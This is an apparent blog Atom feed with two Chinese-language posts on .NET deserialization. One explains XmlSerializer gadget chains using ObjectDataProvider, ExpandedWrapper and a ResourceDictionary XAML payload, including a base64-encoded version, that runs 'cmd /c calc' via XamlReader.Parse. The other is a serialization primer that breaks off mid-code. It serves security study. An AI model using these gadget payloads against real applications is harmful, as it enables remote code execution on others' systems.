<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2024-02-24T13:59:43.419Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dotnet-Deserialization-02</title>
    <link href="https://ke1nys.github.io/posts/3df24b8d.html"/>
    <id>https://ke1nys.github.io/posts/3df24b8d.html</id>
    <published>2024-02-22T08:45:58.000Z</published>
    <updated>2024-02-24T13:59:43.419Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md</a></p><p><a href="https://boogipop.com/2024/02/06/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20XmlSerializer%20Deserialization%2002/">https://boogipop.com/2024/02/06/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20XmlSerializer%20Deserialization%2002/</a></p><h2 id="XmlSerializer"><a href="#XmlSerializer" class="headerlink" title="XmlSerializer"></a>XmlSerializer</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">XmlRoot</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">XmlElement</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        [<span class="meta">XmlElement</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        [<span class="meta">XmlArray(<span class="string">&quot;Items&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> Order[] OrderedItems;</span><br><span class="line">        [<span class="meta">XmlAttribute</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ClassName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Order</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> OrderID;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person p = <span class="keyword">new</span> Person();</span><br><span class="line">            p.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            p.Age = <span class="number">12</span>;</span><br><span class="line">            Order order = <span class="keyword">new</span> Order();</span><br><span class="line">            order.OrderID = <span class="number">123</span>;</span><br><span class="line">            Order order1 = <span class="keyword">new</span> Order();</span><br><span class="line">            order.OrderID = <span class="number">456</span>;</span><br><span class="line">            Order[] orders = <span class="keyword">new</span> Order[] &#123; order, order1 &#125;;</span><br><span class="line">            p.OrderedItems = orders;</span><br><span class="line">            p.ClassName = <span class="string">&quot;classname&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            TextWriter writer = <span class="keyword">new</span> StreamWriter(memoryStream);</span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            xmlSerializer.Serialize(writer, p);</span><br><span class="line"></span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出xml</span></span><br><span class="line">            Console.WriteLine(Encoding.UTF8.GetString(memoryStream.ToArray()));</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            Person p1 = (Person)xmlSerializer.Deserialize(memoryStream);</span><br><span class="line">            Console.WriteLine(p1.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xml里的参数其实问题不大  重点是关注序列化想要的条件</p><ul><li>序列化类需要是public</li><li>需要个writer 将序列化的数据写入内存流中</li><li>XmlSerializer 得传参进去  参数是序列化类的类型</li></ul><p>(不加的就是以二进制的形式进行传输  就是.bin文件)</p><p>输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Person xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; ClassName=&quot;classname&quot;&gt;</span><br><span class="line">  &lt;Items&gt;</span><br><span class="line">    &lt;Order&gt;</span><br><span class="line">      &lt;OrderID&gt;456&lt;/OrderID&gt;</span><br><span class="line">    &lt;/Order&gt;</span><br><span class="line">    &lt;Order&gt;</span><br><span class="line">      &lt;OrderID&gt;0&lt;/OrderID&gt;</span><br><span class="line">    &lt;/Order&gt;</span><br><span class="line">  &lt;/Items&gt;</span><br><span class="line">  &lt;Age&gt;12&lt;/Age&gt;</span><br><span class="line">  &lt;Name&gt;jack&lt;/Name&gt;</span><br><span class="line">&lt;/Person&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他会将我们的对象Object序列化为Xml文本格式，之后反序列化的话就会转换回Person类。<br>上述memory流对象在序列化后position会蹦到文件的末尾，我们需要给他调整为0再进行反序列化才行</p><h2 id="ObjectDataProvider"><a href="#ObjectDataProvider" class="headerlink" title="ObjectDataProvider"></a>ObjectDataProvider</h2><p>这个类我们在01的时候介绍过  其就是可以直接调用到Process然后执行命令</p><p>(刚开始直接用的时候会报错  得导入包才行)</p><p><img src="../images/image-20240224210637750.png" alt="image-20240224210637750"></p><p>刚开始这里的时候会报错  说找不到这个包  <code>ObjectDataProvider</code>就是在这个里面的  所以我们要手动导入一下</p><p><img src="../images/image-20240224210801745.png" alt="image-20240224210801745"></p><p>选择 PresentationFramework依赖  并且添加进去</p><p><img src="../images/image-20240224211000138.png" alt="image-20240224211000138"></p><p>回到正轨上   当我们直接执行上述代码时  calc命令是能直接执行成功  但是xml内容却不会输出出来</p><p><img src="../images/image-20240224211145982.png" alt="image-20240224211145982"></p><p>其实就是因为我们在初始化<code>XmlSerializer</code>这个类的时候  确定的类型是<code>ObjectDataProvider</code></p><p>但在序列化的时候却识别不出来<code>ObjectDataProvider</code>  所以就会导致报错  这样的话就不能反序列化执行了</p><p>我们可以使用<code>ExpandedWrapper</code>类来解决这个问题  </p><p><img src="../images/image-20240224212028497.png" alt="image-20240224212028497"></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Data.Services.Internal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">XmlRoot</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">XmlAttribute</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ClassName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Evil</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Process process = <span class="keyword">new</span> Process();</span><br><span class="line">            process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            process.StartInfo.Arguments = <span class="string">&quot;/c &quot;</span> + cmd;</span><br><span class="line">            process.Start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            TextWriter writer = <span class="keyword">new</span> StreamWriter(memoryStream);</span><br><span class="line">            ExpandedWrapper&lt;Person, ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;Person, ObjectDataProvider&gt;();</span><br><span class="line">            expandedWrapper.ProjectedProperty0 = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodName = <span class="string">&quot;Evil&quot;</span>;</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            expandedWrapper.ProjectedProperty0.ObjectInstance = <span class="keyword">new</span> Person();</span><br><span class="line">            XmlSerializer xml = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(ExpandedWrapper&lt;Person, ObjectDataProvider&gt;));</span><br><span class="line">            xml.Serialize(writer, expandedWrapper);</span><br><span class="line">            <span class="built_in">string</span> result = Encoding.UTF8.GetString(memoryStream.ToArray());</span><br><span class="line">            Console.WriteLine(result);</span><br><span class="line"></span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            xml.Deserialize(memoryStream);</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是拿ExpandedWrapper这个类来进行包装  本质不变  变得就是这个Person里的Evil方法是我们手动添加的  但是在实际环境中是没有这种东西的   那么接下来我们就引出ResourceDictionary这个类</p><p>(其实看到这里这里就会发现ObjectDataProvider是可以调用任意类的任意方法的)</p><h2 id="ResourceDictionary"><a href="#ResourceDictionary" class="headerlink" title="ResourceDictionary"></a>ResourceDictionary</h2><p>ResourceDictionary即资源字典，用于wpf开发，既然是wpf，肯定涉及到xaml语言。先来看利用ResourceDictionary执行命令的一个payload。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;ResourceDictionary </span><br><span class="line">                    xmlns=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span> </span><br><span class="line">                    xmlns:d=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;</span> </span><br><span class="line">                    xmlns:b=<span class="string">&quot;clr-namespace:System;assembly=mscorlib&quot;</span> </span><br><span class="line">                    xmlns:c=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=system&quot;</span>&gt;</span><br><span class="line">    &lt;ObjectDataProvider d:Key=<span class="string">&quot;&quot;</span> ObjectType=<span class="string">&quot;&#123;d:Type c:Process&#125;&quot;</span> MethodName=<span class="string">&quot;Start&quot;</span>&gt;</span><br><span class="line">        &lt;ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">            &lt;b:String&gt;cmd&lt;/b:String&gt;</span><br><span class="line">            &lt;b:String&gt;/c calc&lt;/b:String&gt;</span><br><span class="line">        &lt;/ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">    &lt;/ObjectDataProvider&gt;</span><br><span class="line">&lt;/ResourceDictionary&gt;</span><br></pre></td></tr></table></figure><p>生成Demo(不是上诉payload的Demo  只是演示一下是咋生成的)</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> name = <span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line">        <span class="comment">// private int age = 114;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">XmlDeserialize</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> objectDataProvider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            <span class="keyword">var</span> psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">            <span class="comment">// 去掉多余的环境变量</span></span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            <span class="keyword">var</span> p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            objectDataProvider.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            objectDataProvider.MethodParameters.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">            objectDataProvider.MethodParameters.Add(<span class="string">&quot;/c calc.exe&quot;</span>);</span><br><span class="line">            objectDataProvider.ObjectInstance = p;</span><br><span class="line">            <span class="keyword">var</span> resourceDictionary = <span class="keyword">new</span> ResourceDictionary();</span><br><span class="line">            resourceDictionary[<span class="string">&quot;a&quot;</span>] = objectDataProvider;</span><br><span class="line">            <span class="keyword">var</span> payload = XamlWriter.Save(resourceDictionary);</span><br><span class="line">            Console.WriteLine(payload);</span><br><span class="line">            XamlReader.Parse(payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释下这段xaml：</p><ol><li>xmlns:c 引用了System.Diagnostics命名空间起别名为c</li><li>d:Key=”” 起别名为空，在xaml语法中，Key这个键值必须有。</li><li>ObjectType表示对象类型</li><li>d:Type 等同于typeof()</li><li>MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。</li><li>c:Process 等同于System.Diagnostics.Process</li></ol><p>整个xaml被解析之后，等同于创建了一个ObjectDataProvider对象，该对象又会自动调用<code>System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,&quot;/c calc&quot;)</code></p><p>因为是xaml的语言，我们使用XamlReader.Parse()来解析它</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">//这里的base64就是上面xml的payload</span></span><br><span class="line">            <span class="built_in">string</span> p = <span class="string">&quot;PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==&quot;</span>;</span><br><span class="line">            <span class="built_in">byte</span>[] vs = Convert.FromBase64String(p);</span><br><span class="line">            <span class="built_in">string</span> xml = Encoding.UTF8.GetString(vs);</span><br><span class="line">            XmlDeserialize(xml);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">XmlDeserialize</span>(<span class="params"><span class="built_in">string</span> o</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            XamlReader.Parse(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时相当于我们利用XamlReader.Parse()进行了进一步利用，对于xmlserializer来说攻击链从原来的</p><ul><li>ObjectDataProvider -&gt; Person.Evil()</li></ul><p>转变为</p><ul><li>ObjectDataProvider -&gt; XamlReader.Parse() -&gt; ObjectDataProvider -&gt; System.Diagnostics.Process.Start(“cmd.exe”,”/c calc”)</li></ul><p><strong>拿java来说ObjectDataProvider 更像是commons-collections的InvokerTransformer，可以调用任意类的任意方法。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先就是针对初始化时<code>new XmlSerializer(type)</code>的type参数，如果type可控，就可以利用ObjectDataProvider调用XamlReader的Parse进行RCE。</p><p>当然也要关注<code>XamlReader.Parse(xml)</code>中的xml是否可控。 </p><p>这里的话我们是使用了ResourceDictionary和ExpanderWrapper去用泛型绕过类型的限制</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/m</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-01</title>
    <link href="https://ke1nys.github.io/posts/a4fb1a37.html"/>
    <id>https://ke1nys.github.io/posts/a4fb1a37.html</id>
    <published>2024-02-21T03:02:51.000Z</published>
    <updated>2024-02-24T13:59:43.416Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://boogipop.com/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/#04-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">https://boogipop.com/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/#04-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F</a></p><p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md">https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md</a>   Y4er师傅三年前的文章了</p><p>这里简单将要  其实.Net主要就是C#   这么理解也行  .Net是参考java改过来的  其中SDK对应java的JDK</p><p>jvm对应clr，java se runtime对应 .net framework，java对应C#</p><p>(这个其中的namespace和php里的差不多  所以说学过php和java的再来学这个.Net的话  应该比较好入门)</p><p>这里用的是IDEA的Rider来写  没用VS  搭建环境就不写了</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>在java中，序列化和反序列化需要实现Serializable接口，在dotnet中则是使用<code>特性</code>的方式进行标记Serializable。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Serializable</span>]  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyObject</span></span><br><span class="line">&#123;  </span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">int</span> n1;  </span><br><span class="line">  [<span class="meta">NonSerialized</span>] <span class="keyword">public</span> <span class="built_in">int</span> n2;  </span><br><span class="line">  <span class="keyword">public</span> String str;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>[NonSerialized]</code>来指定不可序列化的字段</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NetSerializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyObject</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> n1;</span><br><span class="line">        